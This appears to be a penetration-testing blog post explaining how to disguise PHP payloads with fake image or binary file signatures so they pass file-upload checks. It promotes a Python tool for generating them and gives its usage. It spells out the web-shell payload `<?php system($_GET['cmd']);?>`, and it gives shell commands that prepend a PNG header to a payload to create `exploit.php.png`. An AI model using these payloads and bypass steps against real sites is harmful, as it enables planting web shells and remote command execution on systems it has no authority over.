---
layout: post
title: Custom Signature PHP Payloads  
tags:
  - Tool
  - Pentest
---

<div class="message">
Easily generating PHP Payloads with Custom file signatures to bypass input sanitization
</div>

![](/assets/images/cpngh/h2.png)


### What is this?
A tip on bypassing input sanitation by changing the payload signature.
This process is generally done in packet analyzer or proxy application like burp but this can be done easily without that.
We will look into two basic ways to achieve this.

### Why this works?
PHP generally start interpreting the script wherever `<?php` tag starts so anything gibberish preceding that will not be executed and that's good news for us as we can now append the payload after some file descriptors so that metadata of the file will show whatever we want it to show but it will still be a valid PHP script.

### Methods

#### Python script

Don't worry I have done the hard work for you, you just need to prepare your payload, we will put the burden of signature management to a script.

Actually this is a small project where I am collecting some of the commonly used file signatures from real files (not the internet and file format wikis) this should give all the payload more convincing results.

You can get the project from GitHub [HERE](https://github.com/Saket-Upadhyay/CustomPhpPayloadSignature)

***With custom python script***
<br>
As simple as

```sh
python cupps.py -s png
```
this will create PHP payload `<?php system($_GET['cmd']);?>` with PNG signature. this is one of the commonly  known tricks to bypass most of the basic image upload scenarios.
![](/assets/images/cpngh/cupps.png)


All the available signatures can be seen by the `-h` parameter.

```sh
$ python cupps.py -h

usage: cupps.py [-h] [-s target_signature]

Script to create PHP Payloads with custom file signatures

optional arguments:
  -h, --help            show this help message and exit
  -s target_signature, --signature target_signature
                        accepted inputs : png,jpg,exe,elf,gif,bmp,jar,pdf,iso

~ with <3 by X64M

```
> NOTE: This is an active project as of 15-08-2020 and I am trying to add more signatures to it so feel free to contribute.


***By appending output of `cat`***

This is one of the neat tricks to achieve this.

just do this :

```sh
cat image.png | head -n 3 >>exploit.php.png
```

this will take the image header and will write to the file `exploit.php.png` 

and then

```sh
cat payload.php >>exploit.php.png
```
This will append the payload to the file with an existing image header.

![](/assets/images/cpngh/bt.png)

And that would just do it.

### Conclusion
Well, that's it for this article. See ya in the next one!

Till then stay caffeinated enough!

--
